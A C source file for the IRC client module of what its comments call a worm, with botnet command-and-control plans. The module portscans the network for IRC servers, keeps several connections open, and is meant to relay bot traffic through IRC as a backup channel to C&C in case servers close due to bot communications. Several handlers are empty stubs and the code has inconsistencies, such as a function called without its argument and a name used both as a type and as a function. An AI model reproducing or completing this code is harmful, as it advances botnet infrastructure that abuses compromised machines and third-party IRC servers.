/*
irc support

this is going to be irc CLIENT support..

there will be a second module that is specifically for IRC server support
that module will be used to link irc->botlink->irc for bots..
it can be used as a backup in case people start closing irc servers due to bot communications
using it to connect to c&c

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include "list.h"
#include "structs.h"
#include "utils.h"
#include "irc.h"
#include "../modules/portscan/portscan.h"

// how many times to attempt to reconnect?
#define IRC_RETRY_TIME 60
#define IRC_RETRY_COUNT 5
#define IRC_CONNECTIONS 5
#define IRC_PORTSCAN_SEED 5

enum {
    IRC_PRIVMSG,
    IRC_CTCP,
    IRC_MOTD,
    
};


typedef struct _irc_custom {
    // irc parameters required for connecting
    char nickname[32];
    char username[16];
    char real_name[64];
    
    // how many times have we attempted to connect to
    // this server again?
    int retry_ts;
    int retry_count;
} IRCCustom;

IRCCustom *IRCVars(Connection *cptr) {
    return (IRCCustom *)CustomPtr(cptr, sizeof(IRCCustom));
}


IRC_Client_Connection *irc_client_list = NULL;

Modules HACK_irc_client = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    6667, 0,
    // required 0, 0..  
    0, 0,
    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &irc_client_funcs, NULL,
    // no magic bytes for portscan
    NULL, 0
};



// for port scanning.. we only care about nodes (starting new connections)
// and the main loop
ModuleFuncs irc_client_funcs = {
    NULL, NULL,
    &irc_client_incoming,
    &irc_client_outgoing,
    &irc_client_main_loop,
    &irc_client_connected,
    &irc_client_disconnect // no disconnect since we give away the connections..
};


// begin scanning for IRC networks..
// reseed the scanner so it starts again
// maybe keep statistics later to skip some..  not sure how to do this yet
int irc_scan() {
    // seed the portscan
    Portscan_Seed(HACK_irc_client.listen_port, IRC_PORTSCAN_SEED);
    // enable it
    Portscan_Enable(HACK_irc_client.listen_port);
}

// initializes the module by adding itself to the port scan
int irc_module_init(Modules **module_list) {
    // prepare port scanning for irc servers..
    Portscan_Add(&HACK_irc_client, HACK_irc_client.listen_port);
    irc_scan();    
}


// we must ensure connectivity, ping/pong, and determine whther any messages are in queue for distribution
// from p2p
int irc_client_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {

    // if we are low on connections.. re-enable the port scan
    // maybe some servers went down?
    if (irc_count() < IRC_CONNECTIONS) {
        irc_scan();
    }  
}

int irc_count(Modules *mptr) {
    int count = 0;
    Connection *cptr = mptr->connections;
    
    while (cptr != NULL) {
        if (stateOK(cptr))
            count++;
            
        cptr = cptr->next;
    }
    
    return count;
}

int irc_client_init(Modules *mptr, Connection *cptr) {
    IRCVars *irccustom = (IRCVars *)IRCVars(cptr);
    
    // we need to generate nicknames, etc
}

// on connect we must generate nickname, user id, and real name
// and push to the server
int irc_client_connected(Modules *mptr, Connection *cptr, char *buf, int size) {
    if (irc_count() > IRC_CONNECTIONS) {
        // disable port scanning if we have connected to five irc servers
        Portscan_Disable(HACK_irc_client.listen_port);
    }
    
    // send initialization information for the new irc server we connected to
    irc_client_init(mptr, cptr);
}


int irc_client_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int irc_client_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size) {
    
}